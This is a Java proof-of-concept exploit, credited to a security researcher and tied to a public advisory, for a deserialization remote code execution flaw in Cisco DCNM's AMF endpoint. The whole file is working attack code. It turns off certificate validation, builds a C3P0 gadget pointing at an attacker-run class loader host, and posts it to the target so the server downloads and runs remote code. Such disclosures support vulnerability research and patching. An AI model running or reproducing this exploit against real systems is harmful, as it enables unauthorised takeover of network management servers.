package uk.co.agileinfosec.DCNMPwn;

import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;
import flex.messaging.io.amf.client.AMFConnection;
import flex.messaging.io.amf.client.exceptions.ClientStatusException;
import flex.messaging.io.amf.client.exceptions.ServerStatusException;
import flex.messaging.messages.RemotingMessage;
import marshalsec.util.Reflections;

import javax.net.ssl.*;
import java.net.Socket;
import java.security.SecureRandom;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;

import static marshalsec.gadgets.C3P0WrapperConnPool.makeC3P0UserOverridesString;

// Exploit for Cisco DCNM AMF Deserialization Remote Code Execution
// by Pedro Ribeiro (pedrib@gmail.com|@pedrib1337) from Agile Information Security
//
// 
// For more info refer to the advisory:
// https://github.com/pedrib/PoC/tree/master/advisories/Cisco/DCNMPwn.md
// https://www.zerodayinitiative.com/advisories/ZDI-22-506/

public class Main {

    public static void callRemote(String url, Object body) throws Exception {
        try {
            AMFConnection amfConnection = new AMFConnection();
            amfConnection.connect(url);
            RemotingMessage rm = new RemotingMessage();
            rm.setClientId("ro");
            rm.setDestination("null");
            rm.setOperation("whatever");
            rm.setBody(body);
            rm.setMessageId("12345");

            Object result = amfConnection.call("foo", rm);

            amfConnection.close();
        }
        catch (ServerStatusException e){
            e.printStackTrace();
        } catch (ClientStatusException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws Exception {
        if (args.length < 4) {
            System.out.println("Usage: java DCNMPwn http[s]://<RHOST>[:RPORT] <CLASSLOADER_LHOST> <CLASSLOADER_LPORT> <CLASS>\n");
        return;
        }

        String rhost = args[0];
        String lhost = args[1];
        String lport = args[2];
        String clazz = args[3];

        // require to trust all certs
        TrustManager[] trustAllCerts = new TrustManager[]{
                new X509ExtendedTrustManager() {
                    @Override
                    public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {
                    }

                    @Override
                    public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {
                    }

                    @Override
                    public X509Certificate[] getAcceptedIssuers() {
                        return null;
                    }

                    @Override
                    public void checkClientTrusted(X509Certificate[] x509Certificates, String s, Socket socket) throws CertificateException {
                    }

                    @Override
                    public void checkServerTrusted(X509Certificate[] x509Certificates, String s, Socket socket) throws CertificateException {
                    }

                    @Override
                    public void checkClientTrusted(X509Certificate[] x509Certificates, String s, SSLEngine sslEngine) throws CertificateException {
                    }

                    @Override
                    public void checkServerTrusted(X509Certificate[] x509Certificates, String s, SSLEngine sslEngine) throws CertificateException {
                    }
                }
        };

        SSLContext sslContext = SSLContext.getInstance("SSL");
        sslContext.init(null, trustAllCerts, new SecureRandom());
        HttpsURLConnection.setDefaultSSLSocketFactory(sslContext.getSocketFactory());

        WrapperConnectionPoolDataSource obj = Reflections.createWithoutConstructor(
                com.mchange.v2.c3p0.WrapperConnectionPoolDataSource.class);
        Reflections.setFieldValue(obj, "userOverridesAsString", makeC3P0UserOverridesString("http://" +
                lhost + ":" + lport + "/", clazz));

        callRemote(rhost + "/fm/messagebroker/amfsecure", obj);
        System.out.println("Finished!");
    }
}
